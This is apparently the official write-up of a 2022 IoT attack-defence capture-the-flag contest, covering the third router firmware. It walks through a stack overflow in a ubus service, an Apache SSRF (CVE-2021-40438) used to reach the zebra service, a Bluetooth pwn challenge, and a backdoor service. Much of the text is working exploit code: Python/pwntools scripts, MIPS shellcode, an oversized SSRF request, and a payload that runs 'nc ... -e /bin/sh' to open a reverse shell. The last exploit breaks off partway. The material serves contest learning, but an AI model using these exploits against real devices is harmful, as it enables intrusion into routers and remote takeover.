# 2022西湖论剑 IoT-AWD 赛题官方 WriteUp （下篇）：三号固件

> 原文: https://www.ctfiot.com/105793.html
> ID: 105793

点击蓝字 关注我们

本届西湖论剑比赛延续了在IoT真实硬件设备上进行解题的竞赛风格，采用了 AWD 攻防赛模式，比赛期间为每个参赛队伍提供一个海特开源路由设备（HatLab Gateboard-One）作为靶标环境。该设备预设若干系统漏洞，参赛队伍可利用不同漏洞对其他队伍得设备发起攻击以获得分数，同时对该设备进行加固防护，避免被其他参赛队伍攻击成功而丢失分数。

比赛提供了四份固件（其中一份是备份固件，比赛时暂未放出），每个固件提供了若干道赛题，下面是各个固件的赛题WriteUp。本文为下篇：三号固件详解。

上篇请点击：《2022西湖论剑 IoT-AWD 赛题官方 WriteUp （上篇）：一号固件&二号固件》

三号固件

3

root shell获取和默认密码重置

查看设备的启动日志可以知道启动参数中console=ttyS0

将串口终端最后打印的信息和第一套固件同样位置的信息作对比可以发现ttyS0所对应的uart串口地址已经从0x1e000c00变成了0x1e000d00，uartlite设备消失。

可以通过dumpimg工具将提供的itb解包出设备树，具体方法可以看2021西湖论剑IOT的wp。查看解包后的设备树文件可以发现uartlite处的状态设置为disabled。删除该行或将状态改为okay后用mkimage重新打包成itb刷入设备即可获得串口root权限。

uartlite@c00 {

    compatible = “ns16550a”;

    reg = <0xc00 0x100>;

    clock-frequency = <0x2faf080>;

    interrupt-parent = <0x01>;

    interrupts = <0x00 0x1a 0x04>;

    reg-shift = <0x02>;

    reg-io-width = <0x04>;

    no-loopback-test;

    status =”disabled”;

};

uartlite2@d00 {

    compatible = “ns16550a”;

    reg = <0xd00 0x100>;

    clock-frequency = <0x2faf080>;

    interrupt-parent = <0x01>;

    interrupts = <0x00 0x1b 0x04>;

    reg-shift = <0x02>;

    reg-io-width = <0x04>;

    pinctrl-names = “default”;

    pinctrl-0 = <0x06>;

    status = “okay”;

};

uartlite3@e00 {

    compatible = “ns16550a”;

    reg = <0xe00 0x100>;

    clock-frequency = <0x2faf080>;

    interrupt-parent = <0x01>;

    interrupts = <0x00 0x1c 0x04>;

    reg-shift = <0x02>;

    reg-io-width = <0x04>;

    pinctrl-names = “default”;

    pinctrl-0 = <0x07>;

    status = “okay”;

};

默认密码修改同第二题。

dsd

通过逆向分析dsd程序，发现里面有ubus_connect函数，猜测与openwrt ubus有关。

在获取到设备shell之后可以用 ubus list 查看注册的类，发现dsd类，再用ubus -v list dsd 查看dsd类注册的方法和消息格式。或者逆向分析dsd程序，分析出方法和消息格式。

可以用ubus call dsd job ‘{“msg”:”aaa”}’ 测试下返回，方便下面的逆向分析

我们都知道可以利用 uhttpd 的模块 和 rpcd 还可以实现通过 http 来访问 ubus 总线，通过分析rpcd的acl的配置文件，我们可以得知dsd job 和 session login 一样都是不需要认证的，可以通过 http 直接访问到

或者可以用 ubus call session list 查看不需要认证的消息中有 dsd job

然后可以通过抓web界面的包，看出uhttpd传递给ubus具体消息格式，结合openwrt的ubus文档https://openwrt.org/zh/docs/techref/ubus

很容易得出uhttp调用ubus call dsd job 的完整消息格式

逆向分析找到dsd程序job方法的主逻辑，下面的”status”和”msg”字段与 ubus call dsd job的 response中的相互对应。可以判断出v8就是我们传入的”msg”

int __fastcall sub_4012F4(int a1, int a2, int a3, int a4, _DWORD *a5)

{

    int v5; // $s0

    int v6; // $v0

    const char *v8; // [sp+20h] [+20h]

    char v9[4]; // [sp+24h] [+24h] BYREF

    int v10; // [sp+28h] [+28h]

    char v11[28]; // [sp+2Ch] [+2Ch] BYREF

    strcpy(v11, “%s received a message: %s”);

    v8 = “(unknown)”;

    v5 = sub_400AA0((int)a5);

    v6 = sub_400B1C(a5);

    blobmsg_parse(&off_4016FC, 2, v9, v5, v6);

    if ( v10 )

      v8 = (const char *)sub_400C74(v10);

    blob_buf_init(&dword_4120E8, 0);

    sub_401024((int)v8);

    sub_400D20((int)&dword_4120E8, (int)”status”, 0);

    sub_400DD0(&dword_4120E8, “msg”, v8);

    ubus_send_reply(a1, a3, dword_4120E8);

    return 0;

}

其中sub_401024函数为处理 msg字符串主逻辑，其中会判断里面是否有*##*字符，然后会进入sub_400F80函数，里面strncpy没有判断size的大小就进行了拷贝，产生了栈溢出

void __fastcall sub_401024(int a1)

{

  char *v1; // [sp+18h] [+18h]

  signed int v2; // [sp+28h] [+28h]

  signed int v3; // [sp+30h] [+30h]

  char *v4; // [sp+34h] [+34h]

  int v5[16385]; // [sp+3Ch] [+3Ch] BYREF

  if ( a1 )

  {

    v1 = strstr((const char *)a1, “action=”);

    if ( v1 )

    {

      if ( strstr(v1 + 7, “ping_test”) )

      {

        sub_400DD0(&dword_4120E8, “action”, “ping_test”);

        sub_400EB0(“www.baidu.com”);

      }

    }

    else

    {

      v2 = *(char *)(a1 + 5) + (*(char *)(a1 + 4) << 8);

      v3 = (*(char *)(a1 + 6) << 8) + *(char *)(a1 + 7);

      if ( v3 < v2 – 7 && v3 < 0x10000 && v2 < 0x10000 )

      {

        memset(v5, 0, 0xFFFFu);

        memcpy(v5, (const void *)(a1 + 8), v2);

        v4 = strstr((const char *)v5, “*##*”);

        if ( v4 )

        {

          if ( v4[4] )

            sub_400F80(v4 + 4, v3);

          sub_400DD0(&dword_4120E8, “job”, “down”);

        }

      }

    }

  }

  __asm { jr      $ra }

}

int __fastcall sub_400F80(const char *a1, size_t a2)

{

  char v4[4100]; // [sp+1Ch] [+1Ch] BYREF

  memset(v4, 0, 0x1000u);

  if ( a1 )

    strncpy(v4, a1, a2);

  sub_400DD0(&dword_4120E8, “good”, “job”);

  return 0;

}

strncpy 函数拷贝的时候有截断，所以我们的payload里面不可以有x00, 由于三号固件的aslr等级为1，heap地址不会变化，通过gdb调试可知输入的”msg”会存放到heap上和stack上。

所以可提供的一种截断栈溢出利用思路为： heap上放编码优化过的无x00 的mipsel shellcode , 然后劫持PC到heap地址上执行。

可提供一种很简单的shellcode思路，只需要8个字节。利用dsd 程序里面的0x400EEC地址jal system,然后再通过调整偏移来设置$a0

size_t sub_4083B0()

{

  char v1[28]; // [sp+18h] [+18h] BYREF

  char v2[68]; // [sp+34h] [+34h] BYREF

  sub_403D98(“type”, v1, 20);

  sub_403D98(“param”, v2, 64);

  if ( filter(v2) )

    return fwrite(“

wrong parameter

n”, 1u, 0x17u, dword_419154);

  if ( !strncmp(v1, “ping”, 4u) )

  {

    exec_ping(v2);

  }

  else if ( !strncmp(v1, “curl”, 4u) )

  {

    exec_curl(v2);

  }

  return fwrite(“donen”, 1u, 5u, dword_419154);

}

shellcode = asm(“jal 0x400EEC”, arch=’mips’, os=’linux’, bits=32)

shellcode += asm(“addiu $a0, $sp, 0x1004”, arch=’mips’, os=’linux’, bits=32)

print(shellcode)

shellcode = “xbbx03x10x0cx04x10xa4x27”

完整exp如下

import requests

from pwn import *

import sys

context.arch = ‘mips’

context.endian = ‘little’

command = “nc 192.168.1.221 6666 -e /bin/sh;”

print(“Command is :” + command)

// shellcode = asm(“jal 0x400EEC”, arch=’mips’, os=’linux’, bits=32)

// shellcode += asm(“addiu $a0, $sp, 0x1004”, arch=’mips’, os=’linux’, bits=32)

// print(shellcode)

shellcode = “xbbx03x10x0cx04x10xa4x27”

rawBody = “{“jsonrpc”:”2.0″,”id”:”0″,”method”:”call”,rn”params”:[“00000000000000000000000000000000″,”dsd”,”job”,{“msg”:”aaaax21x21x20x10*##*” + shellcode + cyclic(

    4028, alphabet=string.ascii_uppercase) + command + cyclic(4104-len(shellcode)-4028-len(command), alphabet=string.ascii_uppercase) + “x58x30x41” + “”}]rn}”

session = requests.Session()

IP = sys.argv[1]

headers = {“Accept”: “*/*”, “User-Agent”: “Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36”,

           “Connection”: “close”, “Accept-Encoding”: “gzip, deflate”, “Accept-Language”: “zh-CN,zh;q=0.9”, “Content-Type”: “application/json”}

response = session.post(“http://{}/ubus/”.format(IP),

                        data=rawBody, headers=headers)

// print(“Status code:   %i” % response.status_code)

// print(“Response body: %s” % response.content)

thefly

查看题目的init脚本：/etc/init.d/thefly

#!/bin/sh /etc/rc.common

START=97

USE_PROCD=1

PROG=/usr/sbin/zebra

start_service() {

procd_open_instance

procd_set_param command “$PROG” “-A” “127.0.0.1” “-f” “/etc/zebra/zebra.conf”

procd_set_param respawn 3600 2 10000

procd_close_instance

}

reload_service() {

procd_send_signal ebles

}

在127.0.0.1上的2601端口中监听了zebra服务，同时通过diff固件可以发现，固件中多了apache二进制，通过strings查看apache的版本，发现是2.4.48，此版本的apache存在ssrf漏洞，CVE编号为CVE-2021-40438。

同时apache2配置文件中定义了代理指令：

ProxyPass /proxy/    http://127.0.0.1:80/

ProxyPassReverse /proxy/    http://127.0.0.1:80/

访问/proxy路由时，会反向代理到127.0.0.1的80端口，由于存在ProxyPass指令，刚好满足了此版本ssrf漏洞的利用条件。结合题目的初始化脚本，可以知道直接使用此漏洞打127.0.0.1的zebra服务。

由于zebra默认开放在2601端口上，且默认密码定义在zebra.conf中，都是zebra：

! -*- zebra -*-

!

! zebra sample configuration file

!

! $Id: zebra.conf.sample,v 1.1 2002/12/13 20:15:30 paul Exp $

!

hostname Router

password zebra

enable password zebra

log stdout

!

! Interface’s description. 

!

!interface lo

! description test of desc.

!

!interface sit0

! multicast

!

! Static default route sample.

!

!ip route 0.0.0.0/0 203.181.89.241

!

!log file zebra.log

因此很容易构造出POC代码，POST数据包体中输入zebra作为服务的登录密码，执行写banner的指令（banner motd file xxx）并再次访问即可读取到flag。参考下面的文章链接：

POST /proxy/?unix:
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://127.0.0.1:
2601/test HTTP/1.1

Host: 127.0.0.1:
8888

User-Agent: curl/7.81.0

Accept: */*

Proxy-Connection: Keep-Alive

Content-Length: 76

zebra

参考：https://paper.seebug.org/1650/

最终读取flag的效果类似：

ble-system

本题将ble和传统pwn题融合，实现了一个ble-system, 在修改密码的时候产生了截断栈溢出，并且可以多次溢出和内存泄露，可利用栈溢出覆盖”x00″, 泄露出libc基址和heap地址，然后申请堆块里面放shellcode，最后再次溢出修改函数返回地址为heap地址，最后getshell。需要注意的是，发送的payload不能有^c信号，否则bleserserver会断开

蓝牙连接工具可以使用ble-serial。

通过ble-scan扫描周围蓝牙设备，带有HZCSSC的就是目标设备。然后用ble-serial -d进行连接，连接之后会将蓝牙串口映射到本地，可以使用minicom -D /tmp/ttyBLE 就可以访问到pwn程序,  或者直接open(“/tmp/ttyBLE”, “ab+”) ，发送payload也行

exp如下

#!/usr/bin/env python3

# -*- coding: utf-8 -*-

from pwn import *

import sys

context.log_level = ‘debug’

pwn_name = “blesystem”

context(os=’linux’, arch=’mips’)

# os.system(“rm /tmp/ttyBLE”)

# p1 = process(“ble-serial -d `ble-scan | grep HZCSSC | awk ‘{print $1}’ | tail -n 1`”, shell=True)

# sleep(20)

p=process(“minicom -D /tmp/ttyBLE”, shell=True)

p.sendlineafter(b”Press Meta-Z for help on special keysrnn”, b’a’)

def change(n):

    p.recvuntil(b’choice >’)

    sleep(0.1)

    p.sendline(b’3′)

    p.recvuntil(b’password:’)

    sleep(0.1)

    p.sendline(n)

    p.recvuntil(b’Press any key continue’)

    sleep(0.1)

    p.sendline(b’a’)

def login(user,passwd):

    p.recvuntil(b’choice >’)

    sleep(0.1)

    p.sendline(b’1′)

    p.recvuntil(b’username:’)

    sleep(0.1)

    p.sendline(user)

    p.recvuntil(b’password:’)

    sleep(0.1)

    p.sendline(passwd)

    p.recvuntil(b’password again:’)

    sleep(0.1)

    p.sendline(passwd)

    p.recvuntil(b’Press any key continue’)

    p.sendline(b’1′)

def add(idx, size , content):

    p.sendlineafter(b’choice >’,b’4′)

    p.can_recv()

    p.sendlineafter(b’choice >’,b’1′)

    p.can_recv()

    p.sendlineafter(b’index: ‘,idx)

    p.can_recv()

    p.sendlineafter(b’size: ‘,size)

    p.can_recv()

    p.recvuntil(b’content: ‘)

    p.sendline(content)

    p.can_recv()

# login(‘admin’,’admin112′)

sleep(0.1)

change(b’a’*47 )

p.sendlineafter(b’choice >’, b’2′)

p.recvuntil(b’aaaa’+b’rn’)

leak_lib = u32(b’x08′ + p.recvuntil(b’x77′)[-3:]) – 0x21a08

log.info(‘leak libc  ‘ + hex(leak_lib))

heap_addr = leak_lib – 0x15890

log.info(‘leak heap  ‘ + hex(heap_addr))

change(b’a’*48 + p32(heap_addr))

shellcode = ”’

    li $a2, 0x666

p:  bltzal $a2, p

    slti $a2, $zero, -1

    addu $sp, $sp, -32

    addu $a0, $ra, 4097

    addu $a0, $a0, -4065

    sw $a0, -24($sp)

    sw $zero, -20($sp)

    addu $a1, $sp, -24

    li $v0, 4011

    syscall 0x40404

sc:

    .byte 0x2f,0x62,0x69,0x6e,0x2f,0x73,0x68,0x00,0x00

”’

shellcode = asm(shellcode, arch=’mips’, os=’linux’, bits=32)

print(shellcode)

print(disasm(shellcode))

shellcode  = base64.b64encode(shellcode)

print(len(shellcode))

add(b’0′, b’80’, shellcode)

# p.sendlineafter(‘choice >’,’5′)

pause()

# p.interactive()

# os.system(“minicom -D /tmp/ttyBLE”)

remote_assistance

后门程序为ophelper，监听在8783端口。

魔改自Xiongmai的历史漏洞CVE-2020-22253

程序的大致流程为：

1

在8789的端口，开始监听客户端连接，当有连接到达时，接收消息并判断是否为”zh1makaim3n”。当消息为”zh1makaim3n”时，可以执行下一步的操作，否则将会关闭会话。其中接收的客户端的数据，第一个byte是客户端消息的长度，然后后续是客户端的消息。

2

如果客户端的第一个信息为“zh1makaim3n”，就生成一个8位的随机数字，然后拼在”seedNum:”后面，并发送给客户端。

3

接着程序根据本地时间生成一个key，并结合刚刚发送的8位随机数字，进行加密。接收客户端数据，并验证结果是否于客户端发送的数据是否一致。其中客户端发送的消息的前8字节为“seedNum:”，若一致，则会发送“Check:OK”给客户端。

4

再次接收客户端的消息，对比前4字节是否为”Req:”,若是的话，就结合刚刚的本地时间key及8为随机数对客户端的加密消息进行解密，若解密结果为”G1vemey0ur5he11!”时，就响应”Open:OK”给客户端。

5

最后，接收客户端消息，提取出其中的ip 及 port，验证其合法性并反弹shell。

其中本地时间的key，可以通过固件中的其他程序，如自带的uhttpd服务获取到设备的本地时间。

EXP:

#!/usr/bin/env python3

# modified pyDes: https://github.com/tothi/pyDes

from pyDes import *

from pwn import *

import argparse

import datetime

import requests

def get_time(ip):

    session = requests.Session()

    paramsGet = {“v”:”git-22.288.45155-afd0012″}

